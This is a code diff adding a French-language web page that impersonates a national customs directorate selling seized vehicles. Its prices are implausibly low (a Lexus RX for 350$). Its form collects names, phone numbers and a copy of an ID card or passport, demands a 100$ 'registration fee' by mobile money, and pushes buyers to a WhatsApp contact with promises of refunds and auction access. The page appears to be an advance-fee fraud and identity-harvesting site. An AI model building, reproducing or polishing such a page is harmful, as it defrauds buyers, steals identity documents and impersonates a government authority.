@@ -1,0 +1,635 @@
+<!doctype html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>La Direction Générale des Douanes</title>
+  <style>
+    /* === VARIABLES DE STYLE === */
+    :root {
+      --primary: #0b84ff;   /* Bleu vif pour les boutons */
+      --secondary: #ff6f00; /* Orange vif pour les accents */
+      --light: #f9f9f9;     /* Fond clair */
+      --dark: #222;         /* Texte sombre */
+    }
+
+    /* === STYLE GLOBAL === */
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #e3f2fd, #fff3e0, #ede7f6);
+      color: var(--dark);
+      max-width:10000%;
+    }
+
+    .file-upload {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    padding: 12px;
+    border: 2px dashed #aaa;
+    border-radius: 10px;
+    cursor: pointer;
+    background: #f9f9f9;
+    transition: border-color 0.3s, background 0.3s;
+    margin-bottom: 15px;
+  }
+
+  .file-upload:hover {
+    border-color: var(--secondary);
+    background: #fff3e0;
+  }
+
+  .file-upload input[type="file"] {
+    flex: 1;
+    border: none;
+    background: transparent;
+    cursor: pointer;
+  }
+
+  .camera-icon {
+    font-size: 1.5rem;
+    color: var(--secondary);
+  }
+
+     .whatsapp-section {
+      text-align: center;
+      margin: 25px 0;
+      font-size: 1.1em;
+    }
+
+    .whatsapp-section img {
+      width: 25px;
+      vertical-align: middle;
+      margin-right: 8px;
+    }
+
+    .whatsapp-section a {
+      color: #003366;
+      font-weight: bold;
+      text-decoration: none;
+    }
+
+    .whatsapp-section a:hover {
+      text-decoration: underline;
+    }
+
+    /*---indique les frais d'inscription*/
+    #frais{
+      font-size: 12px;
+    }
+
+     /* --- SERVICE CLIENT --- */
+    .service {
+      text-align: center;
+      margin: 20px;
+    }
+
+
+     footer {
+      background: #fff;
+      border-top: 2px solid #ccc;
+      display: flex;
+      justify-content: space-around;
+      align-items: center;
+      padding: 15px;
+      font-size: 0.95em;
+    }
+
+    footer img {
+      width: 20px;
+      margin-right: 6px;
+      vertical-align: middle;
+    }
+
+    footer a {
+      color: #003366;
+      text-decoration: none;
+      margin: 0 8px;
+      font-weight: bold;
+    }
+
+    footer a:hover {
+      text-decoration: underline;
+    }
+
+    .socials {
+      display: flex;
+      align-items: center;
+    }
+
+    .container {
+      max-width: 1100px;
+      margin: auto;
+      padding: 20px;
+    }
+
+    /* === EN-TÊTE === */
+    header {
+      background: linear-gradient(90deg, var(--primary), var(--secondary));
+      color: white;
+      padding: 20px;
+      border-radius: 12px;
+      text-align: center;
+    }
+    header h1 {
+      margin: 0;
+      font-size: 2rem;
+    }
+    header p {
+      margin-top: 10px;
+      font-weight: bold;
+      color: #ffecb3;
+    }
+
+    /* === GALERIE DE VEHICULES === */
+    .gallery {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+      gap: 16px;
+      margin: 20px 0;
+    }
+    .card {
+      background: white;
+      border-radius: 12px;
+      overflow: hidden;
+      box-shadow: 0 6px 12px rgba(0,0,0,0.1);
+      transition: transform .3s;
+      cursor: pointer;
+    }
+    .card:hover {
+      transform: translateY(-6px);
+    }
+    .card img {
+      width: 100%;
+      height: 180px;
+      object-fit: cover;
+    }
+    .card .info {
+      padding: 12px;
+    }
+    .card .info h3 {
+      margin: 0;
+      color: var(--secondary);
+    }
+    .card .info p {
+      margin: 5px 0;
+      font-size: 0.9rem;
+      color: #444;
+    }
+
+    /* === FORMULAIRE === */
+    form {
+      background: white;
+      padding: 20px;
+      max-width: 500px;
+      border-radius: 12px;
+      box-shadow: 0 6px 16px rgba(0,0,0,0.1);
+    }
+    form label {
+      display: block;
+      margin-bottom: 5px;
+      font-weight: bold;
+      color: var(--secondary);
+    }
+    form input, form select, form textarea {
+      width: 100%;
+      max-width: 450px;
+      padding: 10px;
+      margin-bottom: 15px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+    }
+    button {
+      background: var(--primary);
+      color: white;
+      border: none;
+      padding: 12px 16px;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 1rem;
+    }
+    button:hover {
+      background: var(--secondary);
+    }
+    .result {
+      margin-top: 15px;
+      background: #e3f2fd;
+      padding: 12px;
+      border-radius: 8px;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <!-- === EN-TÊTE AVEC TITRE ET ANNONCE === -->
+    <header>
+      <img src="image/image7.jpg"  alt="DIRECTION GENERALE DES DOUANES"  width="80">
+      <h1 id="title">La Direction Générale des Douanes</h1>
+      <p>Découvrez nos véhicules et finalisez votre inscription via WhatsApp</p>
+      <p>La Direction Générale des Douanes annonce que tous les véhicules en vente sont en parfait état de fonctionnement et prêts à être mis en circulation.</p>
+    </header>
+
+    <!-- === GALERIE DES VEHICULES === -->
+    <section class="gallery" id="gallery">
+      <!-- Chaque carte représente un véhicule -->
+      <div class="card" data-title="Suv hybride">
+        <img src="image/image1.jpg" alt="Suv hybride">
+        <div class="info">
+          <h3>Suv Hybride</h3>
+          <p>Marque: Lexus Rx</p>
+          <p>Taille:grande</p>
+          <p>Moteur: auto-essence</p>
+          <p>Année: 2018</p>
+          <p>prix: 350$</p>
+          <p>Détails: Économique, idéale pour la ville.</p>
+        </div>
+      </div>
+
+      <div class="card" data-title="SUV dodge">
+        <img src="image/image2.jpg" alt="SUV dodge">
+        <div class="info">
+          <h3>SUV Confort</h3>
+           <p>Marque: Dodge</p>
+          <p>Taille:Grande</p>
+          <p>Moteur:Auto-essence</p>
+          <p>Année: 2018</p>
+          <p>Prix:4500$</p>
+          <p>Détails: Spacieux, idéal pour familles.</p>
+        </div>
+      </div>
+
+      <div class="card" data-title=" toyota Berline Confort">
+        <img src="image/image3.jpg" alt="toyota Berline Confort">
+        <div class="info">
+          <h3>Berline Confort</h3>
+          <p>Marque: Toyota Coralla</p>
+          <p>Taille:Compacte</p>
+          <p>Moteur:Auto-essence</p>
+          <p>Année: 2018</p>
+          <p>Prix:2000$</p>
+          <p>Détails: Sportif et raffiné.</p>
+        </div>
+      </div>
+
+      <div class="card" data-title=" toyota berline grandeur">
+        <img src="image/image4.jpg" alt=" toyota berline grandeur">
+        <div class="info">
+          <h3>Berline Grandeur</h3>
+          <p>Marque: Toyota Avalon</p>
+          <p>Taille: spacieuse</p>
+          <p>Année: 2019</p>
+          <p>Moteur:Auto-essence</p>
+          <p>Prix:2500$</p>
+          <p>Détails: Ideal pour sortis entre amis.</p>
+        </div>
+      </div>
+
+      <div class="card" data-title="mercedes berline">
+        <img src="image/image23.jpg" alt="mercedes berline">
+        <div class="info">
+          <h3>Berline </h3>
+          <p>Marque: Mercedes AMG Coupé</p>
+          <p>Taille: compacte</p>
+          <p>Année: 2022</p>
+          <p>Moteur:Auto-essence</p>
+          <p>Prix:6500$</p>
+          <p>Détails: Compacte et facile à garer.</p>
+        </div>
+      </div>
+
+      <div class="card" data-title="toyota Berline Luxe">
+        <img src="image/image5.jpg" alt="toyota Berline Luxe">
+        <div class="info">
+          <h3>Berline Luxe</h3>
+          <p>Marque: Toyota vx</p>
+          <p>Taille: Grande</p>
+          <p>Année: 2018</p>
+          <p>Prix:7100$</p>
+          <p>Détails: Intérieur haut de gamme.</p>
+        </div>
+      </div>
+
+      <div class="card" data-title="toyota suv robuste">
+        <img src="image/image6.jpg" alt="toyota suv robuste">
+        <div class="info">
+          <h3>Suv Robuste</h3>
+          <p>Marque: Toyota TX</p>
+          <p>Taille: Grande</p>
+          <p>Moteur:Auto-essence</p>
+          <p>Année: 2018</p>
+          <p>Prix:7000$</p>
+          <p>Détails: Parfait pour les terrains difficiles.</p>
+        </div>
+      </div>
+
+       <div class="card" data-title="camry berline">
+        <img src="image/image8.jpg" alt=" camry berline">
+        <div class="info">
+          <h3>Berline</h3>
+          <p>Marque:Toyota Camry </p>
+          <p>Taille: Grande</p>
+          <p>Année: 2019</p>
+          <p>Moteur:Auto-essence</p>
+          <p>Prix:2500$</p>
+          <p>Détails: Parfait pour la ville.</p>
+        </div>
+      </div>
+
+       <div class="card" data-title="toyota 4x4 robuste">
+        <img src="image/image11.jpg" alt="toyota 4x4 robuste">
+        <div class="info">
+          <h3>Pickup Robuste</h3>
+          <p>Marque: Toyota Hilux</p>
+          <p>Taille: Grande</p>
+          <p>Année: 2018</p>
+          <p>Moteur:Auto-essence</p>
+          <p>Prix:7000$</p>
+          <p>Détails: Parfait pour routes hors-piste.</p>
+        </div>
+      </div>
+
+       <div class="card" data-title="Range Rover grandeur">
+        <img src="image/image12.jpg" alt="Range Rover grandeur">
+        <div class="info">
+          <h3> Grandeur</h3>
+          <p>Marque: Range Rover Velar</p>
+          <p>Taille: Grande</p>
+          <p>Année: 2018</p>
+          <p>Moteur:Auto-essence</p>
+          <p>Prix:6500$</p>
+          <p>Détails: Parfait pour routes hors-piste.</p>
+        </div>
+      </div>
+
+       <div class="card" data-title="mercedes 4matic">
+        <img src="image/image13.jpg" alt="mercedes 4matic">
+        <div class="info">
+          <h3>Sudo Confort</h3>
+          <p>Marque: Mercedes 4Matic E450</p>
+          <p>Taille: Grande</p>
+          <p>Année: 2018</p>
+          <p>Moteur:Auto-essence</p>
+          <p>Prix:4300$</p>
+          <p>Détails: Parfait pour routes hors-piste.</p>
+        </div>
+      </div>
+
+       <div class="card" data-title="hyundai">
+        <img src="image/image14.jpg" alt="hyundai">
+        <div class="info">
+          <h3>Hyundai</h3>
+          <p>Marque: Honda Accent</p>
+          <p>Taille: Moyenne</p>
+          <p>Année: 2019</p>
+          <p>Moteur:Auto-essence</p>
+          <p>Prix:3400$</p>
+          <p>Détails: Parfait pour routes hors-piste.</p>
+        </div>
+      </div>
+
+       <div class="card" data-title="Toyota yaris">
+        <img src="image/image15.jpg" alt="Toyota yaris">
+        <div class="info">
+          <h3>Toyota adventure</h3>
+          <p>Marque: Toyota Yaris CH-R</p>
+          <p>Taille: Grande</p>
+          <p>Année: 2018</p>
+          <p>Moteur:Auto-essence</p>
+          <p>Prix:400$</p>
+          <p>Détails: Parfait pour routes hors-piste.</p>
+        </div>
+      </div>
+
+       <div class="card" data-title="mono space">
+        <img src="image/image16.jpg" alt="mono space">
+        <div class="info">
+          <h3>Mono Space</h3>
+          <p>Marque: Hiace</p>
+          <p>Taille: Grande</p>
+          <p>Année: 2018</p>
+          <p>Moteur:Auto-Diesel</p>
+          <p>Prix:6800$</p>
+          <p>Détails: Parfait pour routes hors-piste.</p>
+        </div>
+      </div>
+
+       <div class="card" data-title="honda suv confort">
+        <img src="image/image17.jpg" alt=" honda suv confort">
+        <div class="info">
+          <h3>Suv Sport</h3>
+          <p>Marque: Honda Sport</p>
+          <p>Taille: Grande</p>
+          <p>Année: 2010</p>
+          <p>Moteur:Auto-essence</p>
+          <p>Prix:3500$</p>
+          <p>Détails: Parfait pour routes hors-piste.</p>
+        </div>
+      </div>
+
+       <div class="card" data-title="mercedes Suv haut gamme">
+        <img src="image/image18.jpg" alt="mercedes Suv haut gamme">
+        <div class="info">
+          <h3>Suv haut gamme</h3>
+          <p>Marque: Mercedes GLC300</p>
+          <p>Taille: Compacte</p>
+          <p>Année: 2018</p>
+          <p>Moteur:Auto-essence</p>
+          <p>Prix:5500$</p>
+          <p>Détails: Parfait pour une conduite rafiné ,et un design élégant .</p>
+        </div>
+      </div>
+
+       <div class="card" data-title="suv bmw">
+        <img src="image/image19.jpg" alt="suv Bmw">
+        <div class="info">
+          <h3> Suv BMW</h3>
+          <p>Marque: BMW X1</p>
+          <p>Taille: Compacte</p>
+          <p>Année: 2015</p>
+          <p>Moteur:Auto-essence</p>
+          <p>Prix:3500$</p>
+          <p>Détails: Parfait pour routes hors-piste.</p>
+        </div>
+      </div>
+
+       <div class="card" data-title="Tracteur routier">
+        <img src="image/image20.jpg" alt="Tracteur routier">
+        <div class="info">
+          <h3>Tracteur Routier</h3>
+          <p>Marque: Camion Volvo 500</p>
+          <p>Moteur:Auto-essence</p>
+          <p>Taille: Poid-Lourd</p>
+          <p>Année: 2018</p>
+          <p>Prix:7800$</p>
+          <p>Détails: Parfait pour les transports longues distances.</p>
+        </div>
+      </div>
+
+       <div class="card" data-title="land cruiser Robuste">
+        <img src="image/image21.jpg" alt="land cruiser Robuste">
+        <div class="info">
+          <h3> Toyota Robuste</h3>
+          <p>Marque: Land Cruiser CD-R</p>
+          <p>Taille: Grande</p>
+          <p>Moteur:Auto-essence</p>
+          <p>Année: 2010</p>
+          <p>Prix:7300$</p>
+          <p>Détails: Parfait pour les conditions extrêmes.</p>
+        </div>
+      </div>
+
+       <div class="card" data-title="honda suv confort">
+        <img src="image/image22.jpg" alt="honda suv confot">
+        <div class="info">
+          <h3>Suv Confort</h3>
+          <p>Marque: Honda</p>
+          <p>Taille: Grande</p>
+          <p>Année: 2018</p>
+          <p>Moteur:Auto-essence</p>
+          <p>Prix:3000$</p>
+          <p>Détails: Parfait pour routes hors-piste.</p>
+        </div>
+      </div>
+
+       <div class="card" data-title="4x4 Aventure">
+        <video width="265" height="360" controls>
+        <source src="video/videosD1.mp4" type="video/mp4">
+        </video>
+      </div>
+
+    </section>
+
+    <!-- === FORMULAIRE === -->
+    <section>
+      <h2>Formulaire d'inscription</h2>
+      <form id="regForm" enctype="multipart/form-data" method="POST" action="https://formspree.io/f/ton_code_formspree">
+        <label for="fullname">Nom et prénom</label>
+        <input type="text" id="fullname" required placeholder="Bernard kabese Musangu">
+
+        <label for="phone">Numéro de téléphone</label>
+        <input type="tel" id="phone" required placeholder="243811984219">
+
+        <label for="city">Ville habitée</label>
+        <input type="text" id="city" required placeholder="Kinshassa">
+
+        <label for="email">Adresse e-mail</label>
+        <input type="email" id="email" placeholder="exemple@mail.com">
+
+         <!-- 🔹 SECTION IDENTITÉ -->
+        <label for="identity"> Copie Recto-Verso De La Pièce d'identité ou passeport</label>
+        <div class="file-upload">
+        <span class="camera-icon">📷</span>
+        <input type="file" id="identity" name="identity" accept="image/*,application/pdf" required>
+        </div>
+        <img id="preview" alt="Aperçu de la pièce d'identité" style="display:none; max-width:200px; margin-top:10px; border-radius:8px;">
+
+
+        <label for="vehicle">Véhicule choisi</label>
+        <select id="vehicle"></select>
+
+         <!-- 🔹 SECTION PAIEMENT -->
+        <label for="payment">Moyen de paiement</label>
+        <p id="frais"><strong>BAS:</strong><em>Les frais d'inscription s'élèvent à 100 $</em></p>
+        <select id="payment" name="payment" required>
+        <option value="">Mode De Paiement</option>
+        <option value="Airtel Money">Airtel Money</option>
+        <option value="Vodacom">Vodacom</option>
+        <option value="Orange Money">Orange Money</option>
+        </select>
+
+        <div class="whatsapp-section">
+    <p>
+      <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp">
+      <a href="https://wa.me/+243811984219" target="_blank">WhatsApp</a> - Finalisez votre inscription ?
+    </p>
+        </div>
+      </form>
+      <!--ce commentaire permet de comprendre le bienfait de la vente aux encheres-->
+       <strong>NB:</strong>
+       <p> <em>Veuillez noter que les véhicules seront livrés avec tous les documents nécessaires et un certificat 
+        d'immatriculation, sans frais supplémentaires. Le reçu d'inscription indiquera l'adresse du lieu de la vente 
+        aux enchères afin que nous puissions vous recevoir, ainsi que votre code QR, qui vous donnera un accès direct
+         à la salle des ventes. Vos frais sont remboursables. Merci de votre compréhension</em>. </p>
+
+      <!-- SERVICE CLIENT -->
+  <div class="service">
+    <p>
+      Pour plus d'informations, veuillez contacter le service client :<br>
+      <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp" width="20">
+      <a href="https://wa.me/+243811984219" target="_blank">WhatsApp</a> 
+      📞 +243 811 984 219
+    </p>
+  </div>
+      <div class="result" id="result"></div>
+    </section>
+  </div>
+
+  <script>
+    // === CONFIGURATION : ton numéro WhatsApp à mettre ici ===
+    const whatsappNumber = "22961000000"; // Remplace par ton numéro
+
+    // === REMPLISSAGE AUTOMATIQUE DE LA LISTE DE VEHICULES ===
+    const vehicleSelect = document.getElementById("vehicle");
+    document.querySelectorAll(".card").forEach(card => {
+      let opt = document.createElement("option");
+      opt.value = card.dataset.title;
+      opt.textContent = card.dataset.title;
+      vehicleSelect.appendChild(opt);
+    });
+
+    // === FORMULAIRE : GÉNÉRATION DU LIEN WHATSAPP ===
+    const form = document.getElementById("regForm");
+    const result = document.getElementById("result");
+
+    form.addEventListener("submit", (e) => {
+      e.preventDefault();
+
+      const fullname = document.getElementById("fullname").value;
+      const phone = document.getElementById("phone").value;
+      const city = document.getElementById("city").value;
+      const email = document.getElementById("email").value;
+      const vehicle = document.getElementById("vehicle").value;
+
+      const msg = `Bonjour, je suis ${fullname}.\\nTéléphone: ${phone}\\nVille: ${city}\\nEmail: ${email}\\nVéhicule choisi: ${vehicle}`;
+      const encoded = encodeURIComponent(msg);
+      const waLink = `https://wa.me/${whatsappNumber}?text=${encoded}`;
+
+      result.style.display = "block";
+      result.innerHTML = `<p><strong>Lien WhatsApp :</strong> <a href=\"${waLink}\" target=\"_blank\">Cliquez ici pour finaliser</a></p>`;
+    });
+
+    // === ANIMATION DU TITRE : change de couleur en boucle ===
+    const title = document.getElementById("title");
+    const colors = ["#ffeb3b", "#4caf50", "#03a9f4", "#e91e63"];
+    let idx = 0;
+    setInterval(() => {
+      title.style.color = colors[idx % colors.length];
+      idx++;
+    }, 1500);
+  </script>
+
+     <!-- ----- PIED DE PAGE ----- -->
+  <footer>
+    <div>
+     copyright: © 2025 - Direction Générale des Douanes
+    </div>
+
+    <div>
+      <strong>Nos réseaux :</strong>
+      <div class="socials">
+        <a href="https://www.facebook.com/" target="_blank">
+          <img src="https://upload.wikimedia.org/commons/5/51/Facebook_f_logo_%282019%29.svg">Facebook
+        </a>
+        <a href="https://twitter.com/" target="_blank">
+          <img src="https://upload.wikimedia.org/wikipedia/fr/c/c8/Twitter_Bird.svg">Twitter
+        </a>
+        <a href="https://www.youtube.com/" target="_blank">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg">YouTube
+        </a>
+      </div>
+    </div>
+  </footer>
+</body>
+</html>
